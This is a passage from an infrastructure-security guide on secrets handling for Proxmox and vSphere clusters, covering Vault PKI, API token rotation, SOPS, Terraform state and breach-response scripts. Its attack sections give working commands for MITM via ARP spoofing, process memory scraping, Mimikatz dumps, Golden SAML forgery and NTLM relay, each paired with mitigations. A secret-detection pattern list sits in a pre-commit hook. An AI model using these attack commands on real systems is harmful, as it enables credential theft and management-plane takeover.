  ttl=87600h \
  key_type="ec" \
  key_bits=384 \
  > /tmp/root-ca.crt

# Configure CA URLs
vault write pki/config/urls \
  issuing_certificates="https://vault.infra.internal:8200/v1/pki/ca" \
  crl_distribution_points="https://vault.infra.internal:8200/v1/pki/crl" \
  ocsp_servers="https://vault.infra.internal:8200/v1/pki/ocsp"

# Enable Intermediate CA for hypervisor certs (shorter chain, easier rotation)
vault secrets enable -path=pki_int pki
vault secrets tune -max-lease-ttl=43800h pki_int  # 5 years

# Generate Intermediate CSR
vault write -field=csr pki_int/intermediate/generate/internal \
  common_name="Infrastructure Intermediate CA" \
  issuer_name="intermediate-2026" \
  key_type="ec" \
  key_bits=384 \
  > /tmp/intermediate.csr

# Sign Intermediate with Root
vault write -field=certificate pki/root/sign-intermediate \
  csr=@/tmp/intermediate.csr \
  format=pem_bundle \
  ttl=43800h \
  > /tmp/intermediate.crt

# Import signed intermediate
vault write pki_int/intermediate/set-signed \
  certificate=@/tmp/intermediate.crt

# Create role for Proxmox nodes
vault write pki_int/roles/proxmox-node \
  allowed_domains="infra.internal,pve.lan" \
  allow_subdomains=true \
  allow_bare_domains=false \
  max_ttl=2160h \
  ttl=720h \
  key_type="ec" \
  key_bits=256 \
  require_cn=true \
  enforce_hostnames=true \
  server_flag=true \
  client_flag=true \
  key_usage="DigitalSignature,KeyEncipherment" \
  ext_key_usage="ServerAuth,ClientAuth"

# Issue certificate for a node
vault write pki_int/issue/proxmox-node \
  common_name="pve-node01.infra.internal" \
  alt_names="pve-node01.pve.lan,pve-node01" \
  ip_sans="10.0.1.11" \
  ttl=720h
```

### 5.3 Auto-Renewal with ACME (Internal)

```bash
# step-ca as ACME provider for internal infrastructure
# Install step-ca on dedicated CA server
step ca init --name="Infra CA" --dns="ca.infra.internal" --address=":443" \
  --provisioner="acme-provisioner"

# Enable ACME provisioner
step ca provisioner add acme --type ACME

# On Proxmox node: use certbot or acme.sh with internal CA
acme.sh --issue \
  --server https://ca.infra.internal/acme/acme/directory \
  -d pve-node01.infra.internal \
  --keylength ec-256 \
  --cert-file /etc/pve/local/pveproxy-ssl.pem \
  --key-file /etc/pve/local/pveproxy-ssl.key \
  --ca-bundle /etc/pve/pve-root-ca.pem \
  --reloadcmd "systemctl reload pveproxy"

# Cron for auto-renewal (acme.sh installs this automatically)
# 0 0 * * * /root/.acme.sh/acme.sh --cron --home /root/.acme.sh > /dev/null
```

### 5.4 Certificate Pinning for Inter-Node Communication

```bash
# Proxmox nodes communicate via Corosync (multicast/unicast) and pveproxy
# Pin trusted node certificates in cluster config

# /etc/pve/corosync.conf — encrypt inter-node traffic
totem {
    version: 2
    secauth: on
    crypto_cipher: aes256
    crypto_hash: sha256
}

# Verify node certificate fingerprints
for node in pve-node0{1..5}; do
  echo "=== $node ==="
  openssl s_client -connect ${node}.infra.internal:8006 2>/dev/null | \
    openssl x509 -noout -fingerprint -sha256
done

# Pin in monitoring/alerting — alert if fingerprint changes unexpectedly
# /etc/prometheus/cert-pins.yml
- targets:
    - pve-node01.infra.internal:8006
  labels:
    expected_sha256: "AB:CD:EF:..."
```

### 5.5 Attack: Certificate Exploitation on Management Plane

**Scenario 1: Expired/Self-Signed Certificate MITM**

```
ATTACK FLOW:
1. Attacker on management network observes self-signed cert warning
2. Users habituated to clicking "accept" (cert always self-signed)
3. Attacker performs ARP spoofing on management VLAN:
   $ arpspoof -i eth0 -t 10.0.1.100 10.0.1.11   # Admin → Node
   $ arpspoof -i eth0 -t 10.0.1.11 10.0.1.100   # Node → Admin

4. Proxy connection with attacker's self-signed cert:
   $ mitmproxy --mode transparent --ssl-insecure \
     --set stream_large_bodies=1

5. Capture credentials:
   - Proxmox web UI login (username + password + TOTP if intercepted)
   - API token headers (Authorization: PVEAPIToken=...)
   - vCenter session cookies (vmware_soap_session)

IMPACT: Full management plane compromise via credential theft

MITIGATION:
- Internal CA with proper trust chain (no self-signed warnings)
- Certificate pinning in automation tools
- HSTS on management interfaces
- Network segmentation preventing MITM positioning
```

**Scenario 2: Compromised CA Key**

```
ATTACK FLOW:
1. Attacker reads /etc/pve/priv/pve-root-ca.key (requires root on one node)
2. Issues arbitrary certificates trusted by all cluster nodes
3. Creates fake management endpoint or joins rogue node to cluster
4. Intercepts all inter-node communication (VM migrations, storage replication)

MITIGATION:
- Store CA key in HSM or Vault Transit (never on filesystem)
- Monitor certificate issuance (Vault audit log)
- Implement Certificate Transparency for internal CA
- Separate signing infrastructure from workload infrastructure
```

---

## 6. API Token Security

### 6.1 vSphere API Session Management

```python
# Example: Secure vSphere API client with session management
import atexit
import ssl
from pyVim.connect import SmartConnect, Disconnect
from pyVmomi import vim

def create_vsphere_session(vault_client):
    """Create vSphere session with Vault-sourced dynamic credentials."""
    # Retrieve short-lived credentials from Vault
    secret = vault_client.secrets.kv.v2.read_secret_version(
        path='vsphere/automation-creds',
        mount_point='secret'
    )
    username = secret['data']['data']['username']
    password = secret['data']['data']['password']

    # Create SSL context with pinned CA
    ctx = ssl.create_default_context(cafile='/etc/pki/vcenter-ca.crt')
    ctx.minimum_version = ssl.TLSVersion.TLSv1_3

    si = SmartConnect(
        host='vcenter.infra.internal',
        user=username,
        pwd=password,
        sslContext=ctx,
        connectionPoolTimeout=300  # Session timeout
    )
    atexit.register(Disconnect, si)
    return si


# Session handling best practices:
# 1. Never store session cookies to disk
# 2. Set short session timeout (300s for automation, 900s for interactive)
# 3. Explicitly disconnect/logout when done
# 4. Monitor concurrent sessions per service account
```

**vSphere Token Lifetime Configuration:**

```powershell
# PowerCLI: Configure session timeout
Get-AdvancedSetting -Entity (Get-VMHost) -Name "Config.HostAgent.vmacore.soap.sessionTimeout" |
  Set-AdvancedSetting -Value 300 -Confirm:$false

# vCenter session timeout (vpxd.cfg)
# /etc/vmware-vpx/vpxd.cfg
# <config>
#   <vpxd>
#     <httpSessionTimeout>1800</httpSessionTimeout>
#     <sessionTimeout>30</sessionTimeout>  <!-- minutes -->
#   </vpxd>
# </config>
```

### 6.2 Proxmox API Tokens with Privilege Separation

Proxmox API tokens provide a clean separation model: tokens can have equal or lesser privileges than their parent user.

```bash
# Create dedicated API user (not root)
pveum user add automation@pve --comment "Automation service account"
pveum passwd automation@pve  # Set initial password

# Create role with minimal permissions
pveum role add VMOperator --privs "VM.Audit,VM.PowerMgmt,VM.Console,VM.Snapshot"
pveum role add StorageViewer --privs "Datastore.Audit,Datastore.AllocateSpace"

# Assign roles with path restriction
pveum acl modify /vms --users automation@pve --roles VMOperator
pveum acl modify /storage --users automation@pve --roles StorageViewer

# Create API token WITH privilege separation
pveum user token add automation@pve ci-deploy --privsep 1 \
  --comment "CI/CD deployment token" \
  --expire $(($(date +%s) + 2592000))  # 30-day expiry

# Token output (store in Vault immediately):
# full-tokenid: automation@pve!ci-deploy
# value: 5a3d8f2e-9b7c-4e1a-a6d3-f82e4c9b1d7a

# Assign specific permissions to the token (less than user)
pveum acl modify /vms/100-199 --tokens 'automation@pve!ci-deploy' --roles VMOperator

# Usage in API calls:
curl -s -k \
  -H "Authorization: PVEAPIToken=automation@pve!ci-deploy=5a3d8f2e-9b7c-4e1a-a6d3-f82e4c9b1d7a" \
  "https://pve-node01.infra.internal:8006/api2/json/nodes"
```

### 6.3 Audit Logging of API Token Usage

```bash
# Proxmox API audit log
# /var/log/pveproxy/access.log — records all API calls with token identity

# Enable detailed audit in pveproxy
# /etc/default/pveproxy
ARGS="--logfile /var/log/pveproxy/access.log"

# Parse audit log for suspicious activity
# Detect token usage from unexpected IPs
grep "automation@pve\!ci-deploy" /var/log/pveproxy/access.log | \
  awk '{print $1}' | sort | uniq -c | sort -rn

# Alert on after-hours usage
grep "automation@pve\!ci-deploy" /var/log/pveproxy/access.log | \
  awk -F'[' '{print $2}' | awk -F':' '{if ($2 > 20 || $2 < 6) print $0}'

# Forward to SIEM via rsyslog
# /etc/rsyslog.d/50-pve-audit.conf
if $programname == 'pveproxy' then @siem.infra.internal:514
```

### 6.4 Automated Token Rotation Script

```bash
#!/bin/bash
# /opt/scripts/rotate-pve-token.sh
# Rotates Proxmox API token and updates Vault
set -euo pipefail

VAULT_ADDR="https://vault.infra.internal:8200"
VAULT_TOKEN_FILE="/run/vault-agent/token"
PVE_USER="automation@pve"
TOKEN_NAME="ci-deploy"
PVE_NODE="pve-node01.infra.internal"
VAULT_SECRET_PATH="secret/data/infrastructure/proxmox/api-token"

log() { echo "[$(date -Iseconds)] $*"; }

# Read current Vault token
VAULT_TOKEN=$(cat "$VAULT_TOKEN_FILE")
export VAULT_ADDR VAULT_TOKEN

# Get current token for authentication
CURRENT_TOKEN=$(vault kv get -field=token_value "$VAULT_SECRET_PATH")

# Delete old token
log "Deleting old token..."
curl -sf \
  -H "Authorization: PVEAPIToken=${PVE_USER}!${TOKEN_NAME}=${CURRENT_TOKEN}" \
  -X DELETE \
  "https://${PVE_NODE}:8006/api2/json/access/users/${PVE_USER}/token/${TOKEN_NAME}" \
  || log "WARN: Old token deletion failed (may already be expired)"

# Get a ticket for token creation (need user password from Vault)
PVE_PASS=$(vault kv get -field=password secret/data/infrastructure/proxmox/automation-user)

TICKET_RESPONSE=$(curl -sf \
  -d "username=${PVE_USER}&password=${PVE_PASS}" \
  "https://${PVE_NODE}:8006/api2/json/access/ticket")

TICKET=$(echo "$TICKET_RESPONSE" | jq -r '.data.ticket')
CSRF=$(echo "$TICKET_RESPONSE" | jq -r '.data.CSRFPreventionToken')

# Create new token with 30-day expiry
EXPIRE_EPOCH=$(($(date +%s) + 2592000))
log "Creating new token (expires: $(date -d @${EXPIRE_EPOCH} -Iseconds))..."

NEW_TOKEN_RESPONSE=$(curl -sf \
  -H "Cookie: PVEAuthCookie=${TICKET}" \
  -H "CSRFPreventionToken: ${CSRF}" \
  -d "privsep=1&expire=${EXPIRE_EPOCH}&comment=Rotated $(date -Iseconds)" \
  "https://${PVE_NODE}:8006/api2/json/access/users/${PVE_USER}/token/${TOKEN_NAME}")

NEW_TOKEN_VALUE=$(echo "$NEW_TOKEN_RESPONSE" | jq -r '.data.value')

if [ -z "$NEW_TOKEN_VALUE" ] || [ "$NEW_TOKEN_VALUE" = "null" ]; then
  log "ERROR: Failed to create new token"
  exit 1
fi

# Store new token in Vault
log "Storing new token in Vault..."
vault kv put "$VAULT_SECRET_PATH" \
  token_id="${PVE_USER}!${TOKEN_NAME}" \
  token_value="$NEW_TOKEN_VALUE" \
  created="$(date -Iseconds)" \
  expires="$(date -d @${EXPIRE_EPOCH} -Iseconds)"

log "Token rotation complete."

# Verify new token works
HTTP_CODE=$(curl -sf -o /dev/null -w '%{http_code}' \
  -H "Authorization: PVEAPIToken=${PVE_USER}!${TOKEN_NAME}=${NEW_TOKEN_VALUE}" \
  "https://${PVE_NODE}:8006/api2/json/version")

if [ "$HTTP_CODE" = "200" ]; then
  log "Verification: New token is functional (HTTP 200)"
else
  log "ERROR: New token verification failed (HTTP $HTTP_CODE)"
  exit 1
fi
```

---

## 7. Secrets in Infrastructure as Code

### 7.1 SOPS with Age Encryption for Ansible

Mozilla SOPS (Secrets OPerationS) with age encryption provides a modern alternative to Ansible Vault with better multi-recipient support and git-diff friendliness.

```bash
# Install SOPS and age
apt install -y age
wget -O /usr/local/bin/sops https://github.com/getsops/sops/releases/download/v3.9.0/sops-v3.9.0.linux.amd64
chmod +x /usr/local/bin/sops

# Generate age key pair
age-keygen -o ~/.config/sops/age/keys.txt
# Public key: age1abc123...

# Create .sops.yaml in repository root
cat > .sops.yaml <<'EOF'
creation_rules:
  # Infrastructure secrets — requires both admin keys
  - path_regex: inventories/.*secrets\.ya?ml$
    age: >-
      age1abc123...,
      age1def456...
  # CI/CD pipeline secrets — admin + CI key
  - path_regex: ci/.*secrets\.ya?ml$
    age: >-
      age1abc123...,
      age1ghi789...
EOF

# Encrypt secrets file
cat > inventories/production/group_vars/proxmox/secrets.yml <<'EOF'
pve_api_token: "automation@pve!deploy=5a3d8f2e-..."
ceph_admin_key: "AQB8xY5h..."
ipmi_password: "R0t@t3dP@55!"
vault_unseal_key: "s.AbCdEf..."
EOF

sops -e -i inventories/production/group_vars/proxmox/secrets.yml

# Result: SOPS-encrypted YAML (JSON envelope, values encrypted)
# Can be committed to git safely
# Decryption requires the age private key

# Ansible integration via community.sops collection
# ansible.cfg
[defaults]
vars_plugins_enabled = host_group_vars,community.sops.sops

# Usage in playbook
# The sops vars plugin auto-decrypts *.sops.yml files
```

**Ansible Vault (traditional approach):**

```bash
# Create vault-encrypted file
ansible-vault create inventories/production/group_vars/proxmox/vault.yml

# Encrypt existing file
ansible-vault encrypt secrets.yml

# Use with playbook
ansible-playbook site.yml --vault-password-file /run/secrets/vault-pass

# CRITICAL: Never store vault password in git
# Use Vault (HashiCorp) to provide the Ansible Vault password:
# vault-pass-client.sh:
#!/bin/bash
vault kv get -field=ansible_vault_password secret/infrastructure/ansible
```

### 7.2 Terraform State File Security

Terraform state contains every secret value in plaintext. This is the single most common source of credential leakage in IaC-managed infrastructure.

```hcl
# BAD: Local state with embedded secrets
# terraform.tfstate contains:
# {
#   "resources": [{
#     "type": "proxmox_vm_qemu",
#     "instances": [{
#       "attributes": {
#         "cipassword": "plaintext_password_here!",
#         "ssh_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n..."
#       }
#     }]
#   }]
# }

# GOOD: Remote state with encryption
terraform {
  backend "s3" {
    bucket         = "infra-terraform-state"
    key            = "proxmox/production/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true
    kms_key_id     = "arn:aws:kms:us-east-1:123456789:key/abc-123"
    dynamodb_table = "terraform-locks"
  }
}

# BETTER: Use Vault provider to avoid secrets in state entirely
provider "vault" {
  address = "https://vault.infra.internal:8200"
  # Auth via VAULT_TOKEN env var (set by CI/CD)
}

data "vault_generic_secret" "proxmox_creds" {
  path = "secret/data/infrastructure/proxmox/terraform"
}

provider "proxmox" {
  pm_api_url          = "https://pve-node01.infra.internal:8006/api2/json"
  pm_api_token_id     = data.vault_generic_secret.proxmox_creds.data["token_id"]
  pm_api_token_secret = data.vault_generic_secret.proxmox_creds.data["token_secret"]
  pm_tls_insecure     = false
}

# Mark sensitive outputs
output "node_ip" {
  value     = proxmox_vm_qemu.web.default_ipv4_address
  sensitive = false
}

output "admin_password" {
  value     = random_password.admin.result
  sensitive = true  # Redacted in CLI output, still in state!
}
```

**State File Audit:**

```bash
# Check for secrets in existing state
terraform show -json | jq -r '
  .values.root_module.resources[] |
  select(.values | to_entries[] | .value | tostring |
    test("password|secret|key|token"; "i")) |
  .address
'

# Remediation: use terraform state rm + reimport with Vault data sources
# Or use terraform-external-data pattern to avoid state storage
```

### 7.3 GitOps Secrets Management

**Sealed Secrets (Kubernetes workloads on VMs):**

```yaml
# sealed-secret for database credentials (safe to commit)
apiVersion: bitnami.com/v1alpha1
kind: SealedSecret
metadata:
  name: proxmox-api-creds
  namespace: infrastructure
spec:
  encryptedData:
    token_id: AgBy8w...  # Encrypted with cluster's sealed-secrets public key
    token_secret: AgCx9q...
  template:
    metadata:
      name: proxmox-api-creds
      namespace: infrastructure
    type: Opaque
```

**External Secrets Operator:**

```yaml
# ExternalSecret pulling from Vault
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: proxmox-creds
  namespace: infrastructure
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: vault-backend
    kind: ClusterSecretStore
  target:
    name: proxmox-api-credentials
    creationPolicy: Owner
  data:
    - secretKey: token_id
      remoteRef:
        key: secret/data/infrastructure/proxmox/api-token
        property: token_id
    - secretKey: token_secret
      remoteRef:
        key: secret/data/infrastructure/proxmox/api-token
        property: token_value
```

### 7.4 Git Security: What Must Never Be Committed

```gitignore
# .gitignore — Infrastructure secrets exclusions (MANDATORY)

# Terraform
*.tfvars
*.tfvars.json
terraform.tfstate
terraform.tfstate.backup
.terraform/
*.auto.tfvars

# Ansible
*vault_pass*
*vault-pass*
*.vault_password

# Environment files
.env
.env.*
*.env

# Private keys
*.pem
*.key
*.p12
*.pfx
id_rsa
id_ed25519
id_ecdsa

# Credentials
credentials.json
service-account.json
*credentials*
*secrets.yml
!*.sops.yml  # SOPS-encrypted files ARE safe to commit

# HashiCorp Vault
.vault-token
vault-init-keys.json

# Cloud provider credentials
.aws/
.azure/
.gcp/
kubeconfig*
```

**Pre-commit hook to catch accidental secret commits:**

```bash
#!/bin/bash
# .git/hooks/pre-commit — Block secrets from entering git
set -euo pipefail

# Patterns that indicate secrets
PATTERNS=(
  "PRIVATE KEY"
  "password\s*[:=]"
  "api[_-]?key\s*[:=]"
  "secret[_-]?key\s*[:=]"
  "token\s*[:=]\s*['\"][a-zA-Z0-9]"
  "BEGIN RSA"
  "BEGIN EC"
  "BEGIN OPENSSH"
  "AKIA[A-Z0-9]{16}"      # AWS Access Key
  "vault_token"
)

STAGED_FILES=$(git diff --cached --name-only --diff-filter=ACM)

for file in $STAGED_FILES; do
  for pattern in "${PATTERNS[@]}"; do
    if git diff --cached "$file" | grep -qiE "$pattern"; then
      echo "ERROR: Potential secret detected in $file"
      echo "  Pattern: $pattern"
      echo "  Use 'git diff --cached $file' to review"
      echo "  If intentional, use SOPS encryption before committing"
      exit 1
    fi
  done
done
```

---

## 8. Attack Vectors on Secrets

### 8.1 Memory Scraping for Credentials

**Linux (Proxmox nodes) — /proc filesystem:**

```bash
# Attack: Extract secrets from process memory (requires root or process owner)
# Target: pveproxy, pvedaemon, corosync

# Method 1: /proc/<pid>/environ (environment variables)
cat /proc/$(pgrep pveproxy)/environ | tr '\0' '\n' | grep -i "pass\|token\|key"

# Method 2: /proc/<pid>/maps + gdb for heap analysis
PID=$(pgrep pvedaemon)
grep -E "\[heap\]|\[stack\]" /proc/$PID/maps
# 55a3b1000000-55a3b1200000 rw-p 00000000 00:00 0 [heap]

# Dump heap and search for secrets
gdb -batch -pid $PID -ex "dump memory /tmp/heap.bin 0x55a3b1000000 0x55a3b1200000"
strings /tmp/heap.bin | grep -iE "password|PVEAPIToken|BEGIN"

# Method 3: Direct memory read without gdb
dd if=/proc/$PID/mem bs=1 skip=$((0x55a3b1000000)) count=$((0x200000)) 2>/dev/null | \
  strings | grep -i secret

# Method 4: Volatility-style analysis of live memory
# For VMs: dump guest memory via QEMU monitor
virsh qemu-monitor-command --hmp vm-target 'dump-guest-memory /tmp/vm-mem.raw'
strings /tmp/vm-mem.raw | grep -iE "password|token|key"
```

**Windows (vCenter Server on Windows — legacy deployments):**

```powershell
# Mimikatz on vCenter Windows Server (post-exploitation)
# Extracts vCenter service account credentials from LSASS

# Method 1: Mimikatz sekurlsa
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords

# Output includes:
# - vpxuser password (used by vCenter to manage ESXi hosts)
# - SSO admin credentials if recently authenticated
# - Service account credentials

# Method 2: Extract SSO database
# vCenter stores SSO creds in embedded database
# C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vpxd.cfg
# Contains encrypted DB password — key derivation from Windows DPAPI

# Method 3: DPAPI credential extraction
mimikatz# dpapi::masterkey /in:C:\Users\svc_vcenter\AppData\...\{guid}
mimikatz# dpapi::cred /in:C:\Users\svc_vcenter\AppData\...\Credentials\{cred-guid}
```

**Mitigation:**

```bash
# 1. Disable core dumps
echo '* hard core 0' >> /etc/security/limits.conf
echo 'kernel.core_pattern=|/bin/false' >> /etc/sysctl.d/99-security.conf

# 2. Restrict /proc access
# /etc/fstab: mount proc with hidepid
proc /proc proc defaults,hidepid=2,gid=proc 0 0

# 3. Limit ptrace
echo 'kernel.yama.ptrace_scope=3' >> /etc/sysctl.d/99-security.conf

# 4. Use memory-safe secret handling in applications
# Secrets should be:
# - Locked in memory (mlock)
# - Zeroed after use (explicit_bzero)
# - Never stored in string variables (use SecureString / zeroize crate patterns)
```

### 8.2 Configuration File Extraction

```bash
# VMX file analysis — VM configuration may contain passwords
# Attacker with datastore access can read .vmx files

# Extract all potential secrets from VMX files
find /vmfs/volumes/ -name "*.vmx" -exec grep -liE "password|\.passwd|secret" {} \;

# Common secret-containing VMX entries:
# ide0:0.password = "encrypted_password"      # Encrypted disk password
# RemoteDisplay.vnc.password = "..."          # VNC password (if set)
# guestinfo.userdata = "base64_cloud_init"    # Cloud-init may contain creds
# annotation = "Admin password: P@ss..."      # Human-readable annotations!

# Proxmox VM configuration
cat /etc/pve/qemu-server/100.conf
# May contain: cipassword, sshkeys (public, less critical), args (custom QEMU)

# Storage configuration extraction
cat /etc/pve/storage.cfg
# Output example:
# cifs: nas-backup
#   server 10.0.5.50
#   share backups
#   username backup-svc
#   password SuperSecretNASPassword  # PLAINTEXT!
#   content backup

# vCenter configuration database
# /etc/vmware-vpx/vpxd.cfg — contains encrypted database password
# The encryption key is at /etc/vmware-vpx/ssl/symkey.dat
# With both files: decrypt DB password → full vCenter DB access
```

### 8.3 SAML Token Forging (Golden SAML — VMware SSO)

The Golden SAML attack against VMware vCenter SSO is equivalent to Golden Ticket in Active Directory. With the SSO signing certificate, an attacker can forge authentication tokens for any user.

```
ATTACK CHAIN:

PHASE 1: Obtain SSO Signing Certificate
─────────────────────────────────────────
# On VCSA (after initial compromise with shell access)
# SSO signing key stored in VMware Directory Service (vmdir)

# Extract from vmdir database
/usr/lib/vmware-vmdir/bin/dir-cli trustedcert list --login administrator@vsphere.local

# Or directly from filesystem backup
# /storage/db/vmware-vmdir/data.mdb

# Use ldapsearch to extract private key
ldapsearch -h localhost -p 389 \
  -D "cn=administrator,cn=users,dc=vsphere,dc=local" \
  -w "$SSO_PASSWORD" \
  -b "cn=TenantCredential-1,cn=vsphere.local,cn=Tenants,cn=IdentityManager,cn=Services,dc=vsphere,dc=local" \
  userCertificate userPKCS12

# Decode the PKCS12 blob
echo "$PKCS12_BASE64" | base64 -d > sso-signing.p12
openssl pkcs12 -in sso-signing.p12 -nocerts -nodes -out sso-signing.key
openssl pkcs12 -in sso-signing.p12 -clcerts -nokeys -out sso-signing.crt

PHASE 2: Forge SAML Token
─────────────────────────────────────────
# Using custom tool or modified SAML libraries
# Forge token for administrator@vsphere.local

python3 forge_vcenter_saml.py \
  --signing-key sso-signing.key \
  --signing-cert sso-signing.crt \
  --target-user "administrator@vsphere.local" \
  --token-lifetime 86400 \
  --output forged-saml-token.xml

# The forged token is accepted by all vCenter services
# No password needed, bypasses MFA completely

PHASE 3: Access vCenter with Forged Token
─────────────────────────────────────────
# Inject SAML token into API call
curl -k -X POST "https://vcenter.infra.internal/rest/com/vmware/cis/session" \
  -H "Content-Type: application/xml" \
  -d @forged-saml-token.xml

# Result: Full administrator access to entire vSphere environment

IMPACT:
- Persistent access (token can be regenerated at will)
- Bypasses all authentication controls including MFA
- Valid until SSO signing certificate is rotated
- Provides access to ALL vCenter-managed resources
```

**Detection and Mitigation:**

```bash
# Detection: Monitor for anomalous SAML assertions
# - Token issued without corresponding authentication event
# - Token with unusually long lifetime
# - Token issued for privileged user from unexpected source

# Mitigation 1: Rotate SSO signing certificate
# /usr/lib/vmware-vmdir/bin/dir-cli trustedcert publish --cert new-sso-cert.crt

# Mitigation 2: Enable SSO audit logging
# Monitor: /var/log/vmware/sso/

# Mitigation 3: Use external IdP with SSO (reduces attack surface)
# vCenter → Administration → SSO → Identity Provider → Change to OIDC/ADFS

# Mitigation 4: Restrict access to vmdir database
chmod 600 /storage/db/vmware-vmdir/data.mdb
# Monitor file access with auditd
auditctl -w /storage/db/vmware-vmdir/data.mdb -p r -k vmdir_access
```

### 8.4 Credential Relay Attacks in Management Networks

```
ATTACK: NTLM/Kerberos Relay on vCenter Management Network
──────────────────────────────────────────────────────────

# Windows-based vCenter or AD-integrated environments
# Attacker captures and relays authentication attempts

# Step 1: Poison LLMNR/NBNS/mDNS on management network
responder -I eth0 -wrf

# Step 2: Relay captured NTLM to vCenter
ntlmrelayx.py -tf targets.txt -smb2support \
  -c "powershell -enc <base64_payload>"

# Step 3: If vCenter uses Windows auth, relay to ESXi hosts
# ESXi joined to AD accepts relayed credentials for SSH/API

# Linux relay variant: SSH agent forwarding abuse
# If admin connects to bastion with agent forwarding:
# Attacker on bastion hijacks SSH_AUTH_SOCK:
SSH_AUTH_SOCK=/tmp/ssh-*/agent.* ssh root@pve-node01
# Uses admin's forwarded key without possessing it

MITIGATION:
- Disable LLMNR/NBNS on management network
- Enable SMB signing on all Windows infrastructure
- Never use SSH agent forwarding (use ProxyJump instead)
- Network segmentation: management traffic on dedicated VLAN
- 802.1X on management network ports
```

---

## 9. Secrets Rotation and Revocation

### 9.1 Rotation Schedule Framework

| Secret Type | Rotation Period | Method | Emergency Rotation |
|---|---|---|---|
| API tokens | 30 days | Automated (Vault/script) | Immediate revocation |
| SSH certificates | 8-24 hours (auto) | Vault SSH CA auto-issue | Revoke CA + reissue |
| TLS certificates | 30-90 days | ACME/Vault PKI | Revoke + CRL publish |
| Hypervisor root passwords | 90 days | Vault + automation script | All nodes simultaneously |
| IPMI/BMC passwords | 90 days | Scripted via ipmitool | Physical console if locked out |
| Storage credentials | 60 days | Vault dynamic or rotation script | Depends on backend |
| Cluster join tokens | Single-use | Regenerate per join event | Regenerate + audit nodes |
| Backup encryption keys | 365 days (key wrapping) | Key rotation with re-encryption | Emergency re-encrypt |

### 9.2 Automated Rotation with Vault

```bash
# Vault rotation configuration for database passwords
vault write database/config/proxmox-db \
  plugin_name=mysql-database-plugin \
  connection_url="{{username}}:{{password}}@tcp(db.infra.internal:3306)/" \
  allowed_roles="proxmox-app" \
  username="vault-admin" \
  password="initial-setup-password"

# Rotate the root password (Vault manages it exclusively)
vault write -force database/rotate-root/proxmox-db

# Create role with auto-rotation via TTL
vault write database/roles/proxmox-app \
  db_name=proxmox-db \
  creation_statements="CREATE USER '{{name}}'@'%' IDENTIFIED BY '{{password}}'; GRANT SELECT, INSERT, UPDATE ON proxmox.* TO '{{name}}'@'%';" \
  default_ttl="1h" \
  max_ttl="24h"

# Credentials auto-rotate when lease expires
vault read database/creds/proxmox-app
# lease_id: database/creds/proxmox-app/abc123
# lease_duration: 1h
# username: v-approle-prox-abc123-1234
# password: A1b2C3...auto-generated
```

### 9.3 Emergency Rotation Procedures (Breach Response)

```bash
#!/bin/bash
# /opt/scripts/emergency-rotation.sh
# Execute during suspected credential compromise
# Rotates ALL infrastructure secrets simultaneously

set -euo pipefail
LOG="/var/log/emergency-rotation-$(date -Iseconds).log"
exec > >(tee -a "$LOG") 2>&1

echo "=== EMERGENCY SECRET ROTATION — $(date -Iseconds) ==="
echo "TRIGGERED BY: $USER from $(hostname)"
echo ""

# Phase 1: Revoke all active Vault leases
echo "[PHASE 1] Revoking all Vault leases..."
vault lease revoke -prefix secret/
vault lease revoke -prefix database/creds/
vault lease revoke -prefix pki_int/
vault lease revoke -prefix ssh-client-signer/

# Phase 2: Rotate Proxmox API tokens
echo "[PHASE 2] Rotating API tokens..."
for node in pve-node0{1..5}; do
  echo "  Rotating tokens on $node..."
  ssh root@$node "pveum user token remove automation@pve ci-deploy 2>/dev/null || true"
  # New tokens will be provisioned by Vault Agent on next cycle
done

# Phase 3: Rotate SSH CA
echo "[PHASE 3] Rotating SSH CA key..."
vault delete ssh-client-signer/config/ca
vault write ssh-client-signer/config/ca generate_signing_key=true
NEW_CA_PUB=$(vault read -field=public_key ssh-client-signer/config/ca)
for node in pve-node0{1..5}; do
  echo "  Distributing new CA to $node..."
  echo "$NEW_CA_PUB" | ssh root@$node "cat > /etc/ssh/trusted-user-ca-keys.pub && systemctl reload sshd"
done

# Phase 4: Issue new TLS certificates
echo "[PHASE 4] Reissuing TLS certificates..."
vault write -force pki_int/tidy tidy_cert_store=true tidy_revoked_certs=true
# Vault Agent on each node will auto-renew on next template render

# Phase 5: Rotate hypervisor root passwords
echo "[PHASE 5] Rotating root passwords..."
NEW_ROOT_PW=$(vault write -field=password sys/tools/random/32 format=base64)
for node in pve-node0{1..5}; do
  echo "  Rotating root on $node..."
  ssh root@$node "echo 'root:${NEW_ROOT_PW}' | chpasswd"
done
vault kv put secret/infrastructure/proxmox/root-passwords \
  password="$NEW_ROOT_PW" \
  rotated="$(date -Iseconds)" \
  reason="emergency-breach-response"

# Phase 6: Rotate IPMI passwords
echo "[PHASE 6] Rotating IPMI/BMC passwords..."
/opt/scripts/rotate-ipmi.sh

# Phase 7: Generate new cluster auth keys (CAUTION: may cause brief cluster instability)
echo "[PHASE 7] Regenerating cluster authentication key..."
echo "  WARNING: This may cause brief cluster communication disruption"
pvecm updatecerts --force

echo ""
echo "=== ROTATION COMPLETE — $(date -Iseconds) ==="
echo "ACTIONS REQUIRED:"
echo "  1. Verify all nodes rejoin cluster: pvecm status"
echo "  2. Verify all VMs are running: qm list"
echo "  3. Update CI/CD pipelines to use new tokens (Vault will handle)"
echo "  4. Document this rotation in incident response ticket"
echo "  5. Review audit logs for unauthorized access during compromise window"
```

### 9.4 Vault Lease Management and TTL Strategies

```bash
# View active leases
vault list sys/leases/lookup/database/creds/proxmox-app/

# Inspect specific lease
vault lease lookup database/creds/proxmox-app/abc123

# Renew a lease before expiry
vault lease renew -increment=1h database/creds/proxmox-app/abc123

# Revoke specific lease (immediate credential deletion)
vault lease revoke database/creds/proxmox-app/abc123

# Revoke all leases for a path (emergency)
vault lease revoke -prefix database/creds/proxmox-app

# TTL Strategy recommendations:
#
# Short TTL (1-4h): CI/CD pipelines, automation scripts, one-shot operations
#   Rationale: Credential stolen during pipeline run expires quickly
#
# Medium TTL (8-24h): Service accounts, monitoring agents, Vault Agent tokens
#   Rationale: Balances security with operational stability
#
# Long TTL (7-30d): Backup encryption keys, CA intermediate certs
#   Rationale: Rotation requires coordination; protect with strong access controls
#
# Never infinite: No secret should have TTL=0 (infinite) in production
```

### 9.5 Certificate Revocation

```bash
